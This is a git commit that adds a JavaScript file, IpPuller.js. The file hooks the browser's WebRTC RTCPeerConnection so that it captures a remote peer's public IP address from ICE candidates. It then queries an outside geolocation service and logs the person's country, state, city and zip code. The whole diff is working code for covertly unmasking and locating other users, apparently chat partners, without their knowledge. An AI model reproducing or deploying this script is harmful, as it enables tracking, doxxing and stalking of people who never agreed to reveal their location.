b434a584dc4c8ba35e5a4cedaa273e0ca1b3ff31
TestForCry <67889458+TestForCry@users.noreply.github.com>
2020-10-03 16:33:35 -0400

    Update IpPuller.js

--- IpPuller.js
+++ IpPuller.js
@@ -1,1 +1,36 @@
+window.oRTCPeerConnection = window.oRTCPeerConnection || window.RTCPeerConnection
 
+window.RTCPeerConnection = function(...args) {
+const pc = new window.oRTCPeerConnection(...args)
+
+pc.oaddIceCandidate = pc.addIceCandidate
+
+pc.addIceCandidate = function(iceCandidate, ...rest) {
+const fields = iceCandidate.candidate.split(' ')
+
+function httpGet(Url)
+{
+var xmlHttp = new XMLHttpRequest();
+xmlHttp.open( "GET", Url, false );
+xmlHttp.send( null );
+return xmlHttp.responseText;
+}
+
+if (fields[7] === 'srflx') {
+console.log('---------- NEW CAPTURE ----------')
+console.log('IP Address:', fields[4])
+url = "https://freegeoip.app/json/" + fields[4]
+geographic_info = httpGet(url)
+var data = JSON.parse(geographic_info)
+console.log('Country: ' + data.country_name)
+console.log('State: ' + data.region_name)
+console.log('City: ' + data.city)
+console.log('Zip Code: ' + data.zip_code)
+console.log('---------------------------------')
+}
+return pc.oaddIceCandidate(iceCandidate, ...rest)
+
+}
+
+return pc
+}
